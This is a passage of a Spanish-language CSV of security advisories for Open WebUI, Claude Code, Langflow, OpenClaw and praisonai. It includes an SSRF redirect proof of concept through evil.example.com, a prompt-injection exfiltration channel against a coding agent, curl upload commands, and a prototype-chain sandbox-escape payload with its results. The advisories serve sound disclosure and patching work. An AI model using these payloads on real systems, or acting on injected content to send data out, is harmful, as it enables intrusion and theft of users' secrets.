+- Servicios de metadatos en la nube (AWS IMDSv1 en `169.254.169.254`, GCP `metadata.google.internal`, Azure IMDS) con credenciales IAM y tokens de identidad administrada.
+- Servicios vinculados a localhost (Ollama en `:11434`, Redis, Elasticsearch, exportadores internos de Postgres).
+- Infraestructura interna RFC1918 no expuesta a internet.
+
+## Distinción respecto a CVEs anteriores
+
+**CVE-2026-45338 (GHSA-24c9) frente a este hallazgo:** En el caso anterior, `_process_picture_url` no tenía ninguna llamada a `validate_url()`. Se corrigió en v0.9.0 añadiendo dicha llamada. En el caso actual, la llamada existe pero resulta insuficiente porque no itera sobre los destinos de redirección. Mecanismo diferente, corrección diferente.
+
+**CVE-2026-45400 (GHSA-8w7q) frente a este hallazgo:** El caso anterior afectaba a `validate_url()` por discrepancia entre los parsers de urlparse y requests con caracteres `\@`. Se corrigió en v0.9.5 mediante una lista de bloqueo de caracteres. El caso actual es un seguimiento de redirecciones posterior a la validación, mecanismo ortogonal.
+
+**CVE-2026-45401 (GHSA-rh5x) frente a este hallazgo:** El caso anterior afectaba a cinco rutas en retrieval, routers/images, utils/files y utils/middleware. Es la clase padre. Mismo mecanismo de bypass por redirección (CWE-918). `utils/oauth.py::_process_picture_url` no figura entre las cinco rutas del aviso padre. Misma clase, punto de llamada omitido. Variante directa.
+
+## Corrección sugerida
+
+```python
+async with session.get(
+    picture_url,
+    **get_kwargs,
+    ssl=AIOHTTP_CLIENT_SESSION_SSL,
+    allow_redirects=AIOHTTP_CLIENT_ALLOW_REDIRECTS,   # añadir
+) as resp:
+```
+
+Alternativamente, si las redirecciones deben permanecer habilitadas por defecto, se puede implementar un bucle de seguimiento manual que invoque `validate_url()` sobre cada cabecera `Location`. Este enfoque refleja la forma de corrección aplicada a las cinco rutas de CVE-2026-45401.
+
+## Versiones afectadas
+
+- Vulnerable: versiones hasta 0.9.5 inclusive.
+- Corregido en: 0.9.6.
+
+## Referencias
+
+- CVE-2026-45401 / GHSA-rh5x-h6pp-cjj6 (cluster padre, bypass por redirección en 5 rutas)
+- CVE-2026-45338 / GHSA-24c9-2m8q-qhmh (SSRF original en `_process_picture_url`, parcheado en v0.9.0)
+- CVE-2026-45400 / GHSA-8w7q-q5jp-jvgx (bypass por discrepancia de parsers en `validate_url`, parcheado en v0.9.5)
+- Issue #24560 de Open WebUI (corrobora que la corrección de redirecciones en v0.9.5 se aplicó de forma parcial entre los distintos puntos de llamada)
+
+## Prueba de concepto
+
+PoC de extremo a extremo ejecutado contra `ghcr.io/open-webui/open-webui:v0.9.5` en Docker Compose. Tres servicios: atacante (IdP OIDC y endpoint de redirección 302 en `evil.example.com:9001/redirect`), canario (objetivo interno en `internal-target.local:9002/sentinel`) y Open WebUI v0.9.5.
+
+Sentinel CSPRNG generado después de la llamada de establecimiento de estado OAuth (según el protocolo oracle Gate 5.5): `SSRF-POC-5580111b2a0d7d0c8324bfa92a0d9d09`.
+
+Resultado:
+
+- Campo `profile_image_url` tras el inicio de sesión OAuth: `data:image/jpeg;base64,U1NSRi1QT0MtNTU4MDExMWIyYTBkN2QwYzgzMjRiZmE5MmEwZDlkMDk=`
+- Decodificación base64: `SSRF-POC-5580111b2a0d7d0c8324bfa92a0d9d09` (coincidencia byte a byte con el sentinel)
+- Log del canario: `!!! SSRF HIT - sentinel served`
+
+Cadena confirmada: inicio de sesión OAuth, el IdP devuelve el claim `picture` como `evil.example.com:9001/redirect`, `validate_url()` acepta el FQDN, `aiohttp.ClientSession.get(...)` sigue la redirección 302 hacia `internal-target.local:9002/sentinel` en el lado del servidor sin revalidación, el cuerpo de la respuesta se codifica en base64 en el campo `profile_image_url` del atacante y es legible mediante `GET /api/v1/auths/`.
+
+Los artefactos del PoC (compose, servidor atacante, canario, scripts de ejecución y verificación, transcripción completa) están disponibles bajo petición.
+
+## Investigador
+
+Matteo Panzeri. GitHub: `matte1782`. Contacto: `matteo1782@gmail.com`. Solicita crédito CVE como Matteo Panzeri.","HIGH","8.5","3.1","CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N","Network","Low","Low","None","Changed","High","Low","None","CWE-918","Server-Side Request Forgery (SSRF)","pip","open-webui","<= 0.9.5","0.9.6","Security","Security Advisory","Advisory","2026-06-17","2026-06-17T17:59:59.229Z","matte1782, Classic298","https://github.com/open-webui/open-webui/security/advisories/GHSA-226f-f24g-524w;https://github.com/advisories/GHSA-226f-f24g-524w","US","0","0","open-webui"
+"GHSA-fg94-h982-f3mm","CVE-2026-54316","exfiltracion-datos-fuera-banda-claude-code-via-dominio","https://github.com/advisories/GHSA-fg94-h982-f3mm","Exfiltración de datos fuera de banda en Claude Code via dominio HuggingFace pre-aprobado en WebFetch","Claude Code aprobaba automáticamente cualquier ruta en huggingface.co sin solicitar permisos, permitiendo a un atacante inyectar contenido malicioso y exfiltrar archivos, variables de entorno o salidas de comandos mediante peticiones WebFetch a repositorios controlados por el atacante.","## Descripción de la vulnerabilidad
+
+Se ha identificado una vulnerabilidad de exfiltración de datos fuera de banda en Claude Code, relacionada con el tratamiento del dominio huggingface.co como hostname pre-aprobado en la herramienta WebFetch. Debido a que dicho hostname estaba autorizado de forma global como dominio base, cualquier ruta dentro de ese dominio, incluyendo repositorios de modelos controlados por un atacante, era aprobada automáticamente sin mostrar ningún aviso de permisos al usuario y sin estar sujeta a las restricciones configuradas mediante la opción --allowedTools.
+
+## Mecanismo de explotación
+
+Un atacante con capacidad para inyectar contenido no confiable en el contexto de una sesión de Claude Code podía dirigir al agente a emitir peticiones WebFetch contra archivos alojados en repositorios maliciosos dentro de HuggingFace. Por ejemplo, una petición a una ruta del tipo /resolve/main/config.json era contabilizada por los servidores de HuggingFace como una descarga legítima. Este comportamiento creaba un canal encubierto fuera de banda que permitía codificar y exfiltrar información a la que Claude Code tuviera acceso, incluyendo archivos del sistema de archivos local, variables de entorno del proceso y salidas de comandos ejecutados en el contexto del agente.
+
+La explotación fiable de esta vulnerabilidad requería la capacidad de introducir contenido no confiable en la ventana de contexto de Claude Code, lo cual constituye el vector de entrada principal.
+
+## Impacto
+
+El impacto principal es la exfiltración de datos sensibles disponibles en el entorno de ejecución de Claude Code. Entre los activos potencialmente comprometidos se encuentran:
+
+- Archivos accesibles desde el directorio de trabajo del agente.
+- Variables de entorno que pueden contener credenciales, tokens de API u otra información confidencial.
+- Salidas de comandos ejecutados por el agente durante la sesión.
+
+El canal de exfiltración es especialmente peligroso porque opera de forma encubierta, aprovechando un dominio legítimo y de confianza como HuggingFace, lo que dificulta su detección mediante controles de red convencionales.
+
+## Usuarios afectados
+
+La vulnerabilidad afecta a los usuarios de Claude Code, el agente de codificación desarrollado por Anthropic. Los usuarios que tienen activada la actualización automática estándar de Claude Code ya han recibido la corrección de forma transparente. Se recomienda encarecidamente a los usuarios que realizan actualizaciones manuales que actualicen a la versión más reciente disponible a la mayor brevedad posible.
+
+## Solución y mitigación
+
+Anthopic ha publicado una corrección que modifica el comportamiento de aprobación del dominio huggingface.co en la herramienta WebFetch, de modo que las rutas específicas dentro de ese dominio ya no se aprueban automáticamente sin intervención del usuario. Se recomienda actualizar Claude Code a la última versión disponible.
+
+## Créditos
+
+Esta vulnerabilidad fue reportada de forma responsable por hackerone.com/novee a través del programa de divulgación de vulnerabilidades correspondiente.","MEDIUM","","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","CWE-183","Permissive List of Allowed Inputs","npm","@anthropic-ai/claude-code",">= 0.2.54, < 2.1.163","2.1.163","Security","Security Advisory","Advisory","2026-06-17","2026-06-18T00:54:01.910Z","","https://github.com/anthropics/claude-code/security/advisories/GHSA-fg94-h982-f3mm;https://github.com/advisories/GHSA-fg94-h982-f3mm","US","37.77","-122.42","Anthropic"
+"GHSA-x223-p2gf-v735","CVE-2026-55450","langflow-subida-archivos-autenticacion-permite-dos-filtracion-rutas","https://github.com/advisories/GHSA-x223-p2gf-v735","Langflow: subida de archivos sin autenticación permite DoS y filtración de rutas absolutas","Langflow permite a usuarios no autenticados subir archivos sin límite, agotando el espacio en disco y provocando DoS. Además, la respuesta expone la ruta absoluta del archivo en el servidor, facilitando el encadenamiento de otros ataques. Corregido en la versión 1.9.1.","## Descripción general
+
+Se ha identificado una vulnerabilidad en Langflow que permite a usuarios no autenticados subir cantidades arbitrarias de datos al servidor sin ningún tipo de restricción. El único requisito para explotar esta vulnerabilidad es tener acceso de red al servicio Langflow. No se requiere conocimiento previo ni credenciales.
+
+Esta vulnerabilidad puede derivar en dos impactos distintos: agotamiento del espacio en disco del servidor, lo que puede provocar una condición de DoS, y filtración de información sensible mediante la exposición de la ruta absoluta del directorio de caché de Langflow en el servidor.
+
+## Detalles técnicos
+
+El problema reside en el endpoint `POST /api/v1/upload/{flow_id}`, definido en `langflow/api/v1/endpoints.py`. Dicho endpoint carece por completo de mecanismo de autenticación y no valida el parámetro `flow_id`, a diferencia de otros endpoints de la aplicación.
+
+```python
+@router.post(
+    ""/upload/{flow_id}"",
+    status_code=HTTPStatus.CREATED,
+    deprecated=True,
+)
+async def create_upload_file(
+    file: UploadFile,
+    flow_id: UUID,
+) -> UploadFileResponse:
+    ...
+```
+
+La función `save_uploaded_file` persiste el archivo directamente en el sistema de archivos local sin aplicar ningún límite de tamaño ni validación de contenido. Adicionalmente, la respuesta devuelve la ruta absoluta del archivo almacenado, lo que constituye una filtración de información que puede ser aprovechada para encadenar otros vectores de ataque.
+
+## Prueba de concepto
+
+Cualquier atacante con acceso de red puede ejecutar el siguiente comando para subir un archivo arbitrario al servidor:
+
+```bash
+curl 'http://localhost:7860/api/v1/upload/<any_uuid>' -F ""file=@<any_file>""
+```
+
+Ejemplo real de explotación y respuesta del servidor:
+
+```bash
+curl 'http://localhost:7860/api/v1/upload/11111111-1111-1111-1111-111111111111' -F ""file=@/tmp/dummy.txt""
+```
+
+Respuesta obtenida:
+
+```json
+{
+  ""flowId"": ""11111111-1111-1111-1111-111111111111"",
+  ""file_path"": ""/Users/ori/Library/Caches/langflow/11111111-1111-1111-1111-111111111111/9d63c3b5b7623d1fa3dc7fd1547313b9546c6d0fbbb6773a420613b7a17995c8.txt""
+}
+```
+
+Como se observa, la respuesta expone la ruta absoluta del directorio de caché de Langflow en el servidor, información que puede ser utilizada para preparar ataques adicionales.
+
+## Impacto
+
+1. **Agotamiento de espacio en disco**: un atacante puede subir volúmenes masivos de datos de forma repetida hasta saturar el almacenamiento del servidor, provocando una condición de DoS que afecta a todos los usuarios y servicios que dependan de dicho servidor.
+
+2. **Filtración de información**: la respuesta del endpoint revela la ruta absoluta del directorio de caché de Langflow, lo que permite al atacante conocer la estructura interna del sistema de archivos del servidor y utilizar esa información para encadenar otras primitivas de ataque.
+
+## Corrección recomendada
+
+Los investigadores propusieron las siguientes medidas de mitigación:
+
+1. Añadir autenticación obligatoria al endpoint de subida de archivos.
+2. Devolver únicamente la ruta relativa o el nombre del archivo en la respuesta, nunca la ruta absoluta.
+
+## Parche oficial
+
+La vulnerabilidad fue corregida en la versión **1.9.1** mediante el PR #12831. El endpoint deprecado `POST /api/v1/upload/{flow_id}` incorpora ahora la dependencia `get_flow`, que exige un usuario autenticado y la propiedad del flujo correspondiente. Los flujos inexistentes o pertenecientes a otro usuario devuelven un error `404`. Además, se aplica el límite configurado mediante `max_file_size_upload`, retornando `HTTP 413` cuando se supera dicho límite, cerrando así los vectores de subida no autenticada y agotamiento de disco.
+
+Nota: tras la aplicación del parche, la respuesta continúa devolviendo la ruta absoluta del archivo mediante el campo `file_path`, si bien ahora esta información únicamente se expone al propietario autenticado del flujo.
+
+Se recomienda actualizar a **Langflow 1.9.1 o superior** de forma inmediata.
+
+## Créditos
+
+Vulnerabilidad descubierta y reportada por Ori Lahav, investigador de seguridad en Rubrik Inc. Verificada sobre el commit `2d67402b1dbaefcbce85a244d4a6cd5e4bda1cfe`.","CRITICAL","9.3","3.1","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:H","Network","Low","None","None","Changed","Low","None","High","CWE-200","Exposure of Sensitive Information to an Unauthorized Actor","pip","langflow","< 1.9.1","1.9.1","Security","Security Advisory","Advisory","2026-06-17","2026-06-18T00:25:13.372Z","vbCrLf, Jkavia, erichare, AntonioABLima, andifilhohub, Adam-Aghili","https://github.com/langflow-ai/langflow/security/advisories/GHSA-x223-p2gf-v735;https://github.com/langflow-ai/langflow/pull/12831;https://github.com/advisories/GHSA-x223-p2gf-v735","XX","0","0","langflow"
+"GHSA-v2ww-5rh7-2h5v","CVE-2026-53853","openclaw-omite-validacion-argpattern-listas-blancas-exec-linux","https://github.com/advisories/GHSA-v2ww-5rh7-2h5v","OpenClaw omite validación de argPattern en listas blancas exec en Linux y macOS","OpenClaw no aplicaba las restricciones de argPattern en gateways Linux y macOS con modo allowlist, permitiendo ejecutar argumentos no autorizados en ejecutables permitidos sin solicitar aprobación al operador.","## Resumen
+
+La lista blanca de exec de OpenClaw admitía entradas opcionales `argPattern` para restringir los argumentos aceptados para un ejecutable incluido en dicha lista. En las versiones afectadas, los gateways de Linux y macOS omitían las comprobaciones de `argPattern` y trataban la coincidencia de la ruta del ejecutable como condición suficiente para satisfacer la lista blanca.
+
+Esto significaba que un operador podía configurar una entrada de lista blanca que aparentemente solo permitía una forma concreta de argv, pero OpenClaw permitía otros argv para el mismo ejecutable sin mostrar un aviso de aprobación cuando `tools.exec.security` estaba configurado como `allowlist`.
+
+Este problema se limita a la aplicación directa de los valores `argPattern` configurados. Los mecanismos de aprobación de exec de OpenClaw siguen siendo controles de mejor esfuerzo y no intentan modelar semánticamente cada intérprete, cargador, script de paquete, característica de shell o archivo transitivo que un comando pueda utilizar.
+
+## Configuraciones afectadas
+
+Este problema afecta a los despliegues de gateway de OpenClaw que cumplen todas las siguientes condiciones:
+
+- El gateway se ejecuta en Linux o macOS.
+- Exec está configurado con `tools.exec.security: ""allowlist""`.
+- Al menos una entrada de la lista blanca de exec utiliza `argPattern`.
+- El ejecutable incluido en la lista blanca acepta argumentos o flags con relevancia de seguridad.
+
+Las entradas de lista blanca basadas únicamente en ruta no se ven afectadas adicionalmente por este problema, ya que dichas entradas permiten intencionalmente cualquier argumento para el ejecutable coincidente. Windows no fue afectado por este fallo concreto porque la ruta de código afectada ya aplicaba las comprobaciones de `argPattern` en esa plataforma.
+
+## Impacto
+
+Si un emisor no confiable o de menor confianza puede influir en un agente habilitado con herramientas para que invoque exec, podría ejecutar argumentos no permitidos para un ejecutable que el operador pretendía restringir mediante `argPattern`. Dependiendo del ejecutable, esos argumentos pueden provocar acceso a archivos en el host, acceso a red o ejecución de comandos que deberían haber requerido un aviso de aprobación.
+
+El impacto práctico depende de la lista blanca del operador y de la exposición del canal. Entre los ejecutables de mayor riesgo que podrían estar en la lista blanca se incluyen herramientas con flags de intérprete, cargador, subproceso, red o plugin, tales como `git`, `python`, `node`, `bash`, `find`, `tar` y `ssh`.
+
+Este problema no constituye una elusión de toda la semántica de aprobación de exec. Se trata de una elusión del predicado directo `argPattern` que el operador configuró y que la descripción de la herramienta exec anunciaba como aplicado en tiempo de ejecución.
+
+## Versiones parcheadas
+
+La primera versión estable con el parche aplicado es `2026.5.12`.
+
+## Mitigaciones
+
+Actualizar a `openclaw@2026.5.12` o posterior. Antes de actualizar, los operadores que utilicen el modo de lista blanca de exec deben revisar las entradas que combinan una ruta de ejecutable con `argPattern`, especialmente para herramientas con capacidad de intérprete o subproceso.","HIGH","7.1","3.1","CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L","Network","High","Low","None","Unchanged","High","High","Low","CWE-693","Protection Mechanism Failure","npm","openclaw","< 2026.5.12","2026.5.12","Security","Security Advisory","Advisory","2026-06-18","2026-06-19T10:48:54.404Z","Curly-Haired-Baboon","https://github.com/openclaw/openclaw/security/advisories/GHSA-v2ww-5rh7-2h5v;https://nvd.nist.gov/vuln/detail/CVE-2026-53853;https://www.vulncheck.com/advisories/openclaw-argument-pattern-bypass-in-exec-allowlist-via-linux-and-macos;https://github.com/advisories/GHSA-v2ww-5rh7-2h5v","XX","0","0","openclaw"
+"GHSA-vmmj-pfw7-fjwp","GHSA-vmmj-pfw7-fjwp","escape-sandbox-via-constructor-function-codemode-paquete-npm","https://github.com/advisories/GHSA-vmmj-pfw7-fjwp","Escape de sandbox via constructor Function en codeMode del paquete npm praisonai","El paquete npm praisonai expone la herramienta codeMode como entorno sandboxed, pero su implementación con new Function y listas de bloqueo permite escapar al contexto del proceso Node.js anfitrión mediante la cadena de prototipos JavaScript, accediendo a fs, child_process y variables de entorno.","## Resumen
+
+El paquete npm publicado `praisonai` exporta una herramienta integrada de TypeScript denominada `codeMode`. El paquete describe esta herramienta como ejecutora de código en un entorno sandboxed, marca su capacidad como `sandbox: true` y la registra a través de la fachada pública de herramientas.
+
+La implementación no crea ningún límite de aislamiento real. Aplica una pequeña lista de bloqueo basada en expresiones regulares, establece `process` y `require` como `undefined` dentro de un objeto JavaScript plano y, a continuación, ejecuta código controlado por el atacante mediante el constructor `new Function` del proceso anfitrión:
+
+```javascript
+const fn = new Function('sandbox', `with (sandbox) { ${code} }`);
+const result = fn(sandbox);
+```
+
+Dado que esto se ejecuta en el contexto V8 del proceso anfitrión, el código dentro de `codeMode` puede utilizar la cadena de prototipos de JavaScript para recuperar el constructor `Function` real:
+
+```javascript
+({}).constructor.constructor('return process')()
+```
+
+Desde un script CommonJS normal, el objeto `process` recuperado expone `process.mainModule.require`. Esto elude los controles explícitos sobre `require('fs')` y `require('child_process')` y permite el acceso al sistema de archivos del anfitrión y la ejecución de subprocesos desde código que se suponía estaba sandboxed.
+
+## Detalles Técnicos
+
+El código fuente actual indica que `codeMode` es una herramienta integrada del paquete y anuncia explícitamente un límite de sandbox:
+
+```text
+src/praisonai-ts/src/tools/builtins/code-mode.ts
+  13: description: 'Execute code that can import and use other tools in a sandboxed environment',
+  24: capabilities: {
+  25:   sandbox: true,
+  26:   code: true,
+  28: packageName: 'praisonai',
+  85: description: 'Execute code in a sandboxed environment with access to imported tools. Write files, run code, and get results.',
+```
+
+El mismo archivo implementa la seguridad como una lista de bloqueo de patrones exactos en el código fuente:
+
+```text
+src/praisonai-ts/src/tools/builtins/code-mode.ts
+  108: const blockedPatterns = [
+  109:   /require\s*\(\s*['""']child_process['""']\s*\)/,
+  110:   /require\s*\(\s*['""']fs['""']\s*\)/,
+  111:   /import\s+.*from\s+['""']child_process['""']/,
+  112:   /process\.exit/,
+  113:   /eval\s*\(/,
+```
+
+A continuación intenta ocultar los globales peligrosos sobreponiendo nombres en un objeto normal:
+
+```text
+src/praisonai-ts/src/tools/builtins/code-mode.ts
+  168: process: undefined,
+  169: require: undefined,
+```
+
+Finalmente, ejecuta el código no confiable en el proceso anfitrión usando `new Function` y `with (sandbox)`:
+
+```text
+src/praisonai-ts/src/tools/builtins/code-mode.ts
+  187: const fn = new Function(
+  188:   'sandbox',
+  189:   `with (sandbox) { ${code} }`
+  190: );
+  191: const result = fn(sandbox);
+```
+
+Esto no es un sandbox. `new Function` no crea un contexto de seguridad separado, y el sombreado de variables no elimina el acceso a los constructores alcanzables a través de objetos JavaScript normales.
+
+La herramienta es accesible a través del SDK npm público:
+
+```text
+src/praisonai-ts/src/index.ts
+  117: airweaveSearch, codeMode,
+
+src/praisonai-ts/src/tools/tools.ts
+  104: // Code Mode
+  105: registry.register(CODE_MODE_METADATA, createCodeModeTool as ToolFactory);
+  167: // Code Mode
+  168: codeMode: (config?: CodeModeConfig) => codeMode(config),
+```
+
+### Por Qué Esto No Es Comportamiento Intencionado
+
+Esto no es simplemente que el usuario pueda ejecutar código porque `codeMode` ejecuta código. La vulnerabilidad consiste en que el código descrito y expuesto explícitamente como sandboxed puede escapar las restricciones previstas.
+
+La propia implementación demuestra que existe un límite de seguridad intencionado:
+
+- `CODE_MODE_METADATA.capabilities.sandbox` es `true`.
+- La descripción de la herramienta indica que se ejecuta en un entorno sandboxed.
+- El acceso directo a `fs` y `child_process` está explícitamente bloqueado.
+- `process` y `require` están explícitamente sombreados como `undefined`.
+- `allowNetwork` tiene valor predeterminado `false`.
+- La configuración incluye controles relevantes para la seguridad como `blockedTools`, `allowedPaths`, `timeoutMs` y `maxMemoryMb`.
+
+La prueba de concepto demuestra que esas restricciones previstas funcionan para payloads ingenuos, pero fallan ante un escape estándar mediante la cadena de prototipos de JavaScript.
+
+La documentación oficial de JavaScript y TypeScript de PraisonAI describe el paquete npm como un framework de agentes listo para producción que se instala con `npm install praisonai`. Los avisos públicos de PraisonAI califican escapes de sandbox comparables en Python como Críticos cuando el código suministrado por el usuario o por un LLM cruza desde un sandbox declarado hacia la ejecución en el anfitrión.
+
+## Prueba de Concepto
+
+La prueba de concepto instala una versión publicada del paquete npm en un proyecto temporal y se ejecuta desde un archivo de script CommonJS real. Ejecutar desde un archivo es importante porque las aplicaciones Node normales exponen `process.mainModule.require`; `node -e` o stdin no siempre reproducen esa forma de despliegue.
+
+Ejecución desde un checkout de reproducción local:
+
+```bash
+node poc/pov_poc.js 1.7.1
+```
+
+Resultado observado:
+
+```json
+{
+  ""package"": ""praisonai"",
+  ""version"": ""1.7.1"",
+  ""codeModeExported"": true,
+  ""directRequireFsControl"": {
+    ""stderr"": ""Blocked pattern detected: require\\s*\\(\\s*['\""]fs['\""]\\s*\\)"",
+    ""exitCode"": 1,
+    ""success"": false,
+    ""error"": ""Code contains blocked patterns for security""
+  },
+  ""directChildProcessControl"": {
+    ""stderr"": ""Blocked pattern detected: require\\s*\\(\\s*['\""]child_process['\""]\\s*\\)"",
+    ""exitCode"": 1,
+    ""success"": false,
+    ""error"": ""Code contains blocked patterns for security""
+  },
+  ""escapedProcessEnv"": {
+    ""output"": ""poc"",
+    ""exitCode"": 0,
+    ""success"": true
+  },
+  ""escapedFilesystem"": {
+    ""output"": ""fs-ok"",
+    ""exitCode"": 0,
+    ""success"": true
+  },
+  ""escapedCommand"": {
+    ""output"": ""poc"",
+    ""exitCode"": 0,
+    ""success"": true
+  }
+}
+```
+
+Interpretación:
+
+- El `require('fs')` directo está bloqueado.
+- El `require('child_process')` directo está bloqueado.
+- El payload con el constructor Function recupera el `process` del anfitrión.
+- El proceso escapado lee una variable de entorno del anfitrión.
+- El proceso escapado importa `fs`.
+- El proceso escapado importa `child_process` y ejecuta un `printf` inofensivo.
+
+La prueba de concepto no contacta ningún proveedor de LLM ni servicio externo tras la instalación del paquete npm. No modifica archivos del anfitrión ni ejecuta un comando destructivo.
+
+## Impacto
+
+Un atacante que pueda suministrar código a `codeMode` puede escapar del sandbox anunciado y ejecutar con los privilegios del proceso Node.js de PraisonAI.
+
+Los vectores de entrada realistas incluyen:
+
+- Una aplicación que expone `codeMode` como herramienta de agente a usuarios finales.
+- Un flujo LLM o de llamada a herramientas donde el contenido controlado por prompt alcanza el parámetro `code`.
+- Integraciones MCP o de registro de herramientas que hacen que la herramienta integrada `codeMode` sea invocable.
+- Cualquier servicio multitenant que dependa de `codeMode` para ejecutar de forma segura JavaScript generado por usuarios o modelos.
+
+El impacto tras el escape incluye:
+
+- Lectura de variables de entorno del proceso, incluyendo claves de API y tokens de servicio.
+- Lectura de archivos disponibles para el proceso Node.
+- Lanzamiento de subprocesos mediante `child_process`.
+- Escritura o modificación de archivos a través de las API del sistema de archivos del anfitrión.
+- Terminación o agotamiento de recursos del proceso anfitrión.
+
+## Corrección Sugerida
+
+No se debe usar `new Function` en el proceso anfitrión junto con listas de bloqueo de código fuente como sandbox.
+
+Dirección de corrección recomendada:
+
+1. Deshabilitar o marcar claramente el `codeMode` de npm como inseguro hasta que exista un límite de aislamiento real.
+2. Ejecutar el código no confiable en un proceso de sistema operativo separado, contenedor, worker isolate o límite similar con un usuario restringido, entorno mínimo, directorio de trabajo temporal, sin secretos heredados y con IPC explícito para las llamadas a herramientas permitidas.
+3. Aplicar `allowNetwork`, `allowedPaths`, `timeoutMs`, `maxMemoryMb`, `allowedTools` y `blockedTools` en ese límite en lugar de mediante el escaneo de cadenas de código fuente.
+4. No depender únicamente de `node:vm` para código no confiable. La documentación de Node.js indica explícitamente que el módulo `vm` no es un mecanismo de seguridad.
+5. Añadir pruebas de regresión para:
+   - Controles de bloqueo de `require('fs')` y `require('child_process')` directos.
+   - Bloqueo de `({}).constructor.constructor('return process')()`.
+   - Indisponibilidad de `process.mainModule.require('fs')`.
+   - Indisponibilidad de `process.mainModule.require('child_process')`.
+   - Variables de entorno del anfitrión no disponibles salvo que se pasen explícitamente.
+   - IPC de llamadas a herramientas que sigue funcionando para herramientas permitidas.
+
+Si los mantenedores necesitan una mitigación de emergencia antes de que exista un sandbox real, se recomienda rechazar la ejecución de `codeMode` a menos que el llamador opte explícitamente por la opción de ejecución JavaScript insegura en el anfitrión, con documentación clara de que puede acceder al proceso Node completo.
+
+## Paquetes y Versiones Afectadas
+
+- Repositorio: `MervinPraison/PraisonAI`
+- Ecosistema: `npm`
+- Paquete: `praisonai`
+- Componente: `src/praisonai-ts/src/tools/builtins/code-mode.ts`
+- Versión npm verificada: `1.7.1`
+- Commit de `origin/main` verificado: `1ad58ca02975ff1398efeda694ea2ab78f20cf3e`
+
+Rango afectado confirmado:
+
+```text
+>= 1.4.0, <= 1.7.1
+```
+
+Límite inferior: la versión 1.3.6 no exporta `codeMode` y no incluye `dist/tools/builtins/code-mode.js`.
+
+No se conoce ninguna versión npm corregida en el momento de este informe.
+
+### Barrido de Versiones
+
+El barrido incluido instala versiones npm seleccionadas y ejecuta la misma forma vulnerable desde un archivo de script:
+
+```bash
+node poc/version_sweep_poc.js
+```
+
+Resultado observado:
+
+```text
+1.3.6: codeModeExported=false, hasDistCodeMode=false
+1.4.0: directRequireFsBlocked=true, escapeProcessEnv=true, escapeFilesystem=true, escapeCommand=true
+1.5.4: directRequireFsBlocked=true, escapeProcessEnv=true, escapeFilesystem=true, escapeCommand=true
+1.6.0: directRequireFsBlocked=true, escapeProcessEnv=true, escapeFilesystem=true, escapeCommand=true
+1.7.0: directRequireFsBlocked=true, escapeProcessEnv=true, escapeFilesystem=true, escapeCommand=true
+1.7.1: directRequireFsBlocked=true, escapeProcessEnv=true, escapeFilesystem=true, escapeCommand=true
+```
+
+El historial de Git para el archivo TypeScript apunta a la integración de la versión 1.4.0:
+
+```text
+56f36e25 feat: bump version to 1.4.0 and add AI SDK integration dependencies
+2bad9a50 feat: bump version to 1.4.0 and add AI SDK integration dependencies
+```
+
+## Historial de Avisos
+
+Los avisos relacionados más cercanos tienen alcance Python o PyPI y no cubren esta implementación TypeScript de npm:
+
+- `GHSA-qf73-2hrx-xprp` / `CVE-2026-39888`: `pip:praisonaiagents` con traversal de frames en `execute_code()` dentro de un sandbox de subproceso Python.
+- `GHSA-4mr5-g6f9-cfrh` / `CVE-2026-47392`: `pip:praisonai` con escape de sandbox Python en `execute_code()` mediante `print.__self__`.
+- Otros avisos publicados de PraisonAI cubren `execute_code` en Python, `SubprocessSandbox`, Sandlock o puentes CLI.
+
+Este informe es distinto porque apunta a: ecosistema `npm`, paquete `praisonai`, componente `code-mode.ts`, causa raíz de `new Function` en contexto anfitrión con lista de bloqueo y sombreado de nombres, y rango afectado `>= 1.4.0, <= 1.7.1`.","CRITICAL","9.9","3.1","CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H","Network","Low","Low","None","Changed","High","High","High","CWE-184","Incomplete List of Disallowed Inputs","npm","praisonai",">= 1.4.0, <= 1.7.1","1.7.2","Security","Security Advisory","Advisory","2026-06-18","2026-06-19T10:53:46.498Z","rexpository","https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-vmmj-pfw7-fjwp;https://github.com/advisories/GHSA-vmmj-pfw7-fjwp","XX","0","0","praisonai"
+"GHSA-qrpv-q767-xqq2","CVE-2026-55255","idor-endpoint-apiv1responses-langflow-permite-ejecutar-flujos-otros","https://github.com/advisories/GHSA-qrpv-q767-xqq2","IDOR en endpoint /api/v1/responses de Langflow permite ejecutar flujos de otros usuarios autenticados","Vulnerabilidad IDOR en Langflow permite a usuarios autenticados ejecutar flujos ajenos especificando el flow ID de la víctima. La función get_flow_by_id_or_endpoint_name no verifica la propiedad al buscar por UUID. Corregido en Langflow 1.9.1.","## Resumen
+
+Se ha identificado una vulnerabilidad de tipo Insecure Direct Object Reference (IDOR) en el endpoint `/api/v1/responses` de Langflow. Un atacante autenticado puede ejecutar cualquier flujo perteneciente a otro usuario simplemente especificando el flow ID de la víctima en la solicitud, sin necesidad de privilegios adicionales.
+
+## Detalles técnicos
+
+La vulnerabilidad reside en la función auxiliar `get_flow_by_id_or_endpoint_name`, ubicada en `src/backend/base/langflow/helpers/flow.py` (líneas 399-414). Cuando se accede a un flujo mediante su UUID, la función consulta la base de datos directamente sin verificar si el usuario autenticado es el propietario de dicho flujo.
+
+El comportamiento defectuoso se puede observar en el siguiente fragmento:
+
+```python
+async def get_flow_by_id_or_endpoint_name(flow_id_or_name: str, user_id: str | UUID | None = None) -> FlowRead:
+    async with session_scope() as session:
+        try:
+            flow_id = UUID(flow_id_or_name)
+            # Al usar UUID, la consulta se realiza SIN verificar user_id
+            flow = await session.get(Flow, flow_id)  # Sin comprobación de user_id
+        except ValueError:
+            endpoint_name = flow_id_or_name
+            stmt = select(Flow).where(Flow.endpoint_name == endpoint_name)
+            # Solo al usar endpoint_name se verifica el user_id
+            if user_id:
+                stmt = stmt.where(Flow.user_id == uuid_user_id)
+```
+
+Esta función es utilizada por el endpoint `/api/v1/responses`, definido en `src/backend/base/langflow/api/v1/openai_responses.py` (línea 589). La inconsistencia en la lógica de autorización entre la búsqueda por UUID y la búsqueda por nombre de endpoint es el origen de la vulnerabilidad.
+
+## Prueba de concepto
+
